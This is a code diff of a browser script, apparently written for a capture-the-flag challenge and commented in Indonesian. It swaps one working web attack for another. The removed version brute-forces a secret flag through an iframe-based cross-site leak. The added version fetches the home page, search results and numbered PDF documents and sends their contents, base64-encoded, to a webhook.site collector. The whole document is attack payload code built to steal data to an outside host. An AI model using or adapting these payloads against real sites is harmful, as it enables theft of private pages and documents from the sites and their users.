@@ -1,52 +1,34 @@
 <script>
-const TARGET = "https://wonder.cbd2026.cloud/search?q=";
-const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
-  
+const WEBHOOK = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
 
-// charset flag (biasanya gini di CTF)
-const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
-
-function check(q) {
-  return new Promise(resolve => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-
-    iframe.onload = () => {
-      // trick: kalau ada result → iframe lebih "berat"
-      setTimeout(() => {
-        try {
-          // heuristic: jumlah subframe
-          const len = iframe.contentWindow.length;
-          resolve(len > 0);
-        } catch {
-          // SOP kena → fallback ke TRUE
-          resolve(true);
-        }
-        iframe.remove();
-      }, 500);
-    };
-
-    iframe.src = TARGET + encodeURIComponent(q);
-    document.body.appendChild(iframe);
-  });
+// fungsi kirim data
+function send(tag, data) {
+  fetch(WEBHOOK + "?tag=" + tag + "&d=" + btoa(data)).catch(()=>{});
 }
 
-async function solve(prefix) {
-  fetch(`${LOGGER}?progress=${prefix}`);
+// dump halaman utama
+fetch("/")
+  .then(r => r.text())
+  .then(d => send("home", d));
 
-  for (const c of ALPHABET) {
-    const test = prefix + c;
-    const ok = await check(test);
+// dump search kosong
+fetch("/search?q=")
+  .then(r => r.text())
+  .then(d => send("search", d));
 
-    if (ok) {
-      fetch(`${LOGGER}?found=${test}`);
-
-      if (c === '}') return;
-      return solve(test);
-    }
-  }
+// brute PDF ID (ini penting)
+for (let i = 1; i <= 20; i++) {
+  fetch("/pdfs/" + i)
+    .then(r => r.text())
+    .then(d => send("pdf_" + i, d))
+    .catch(()=>{});
 }
 
-// IMPORTANT: flag biasanya uppercase di challenge lo
-solve("CBD{");
+// coba raw juga
+for (let i = 1; i <= 20; i++) {
+  fetch("/pdfs/" + i + "/raw")
+    .then(r => r.text())
+    .then(d => send("raw_" + i, d))
+    .catch(()=>{});
+}
 </script>
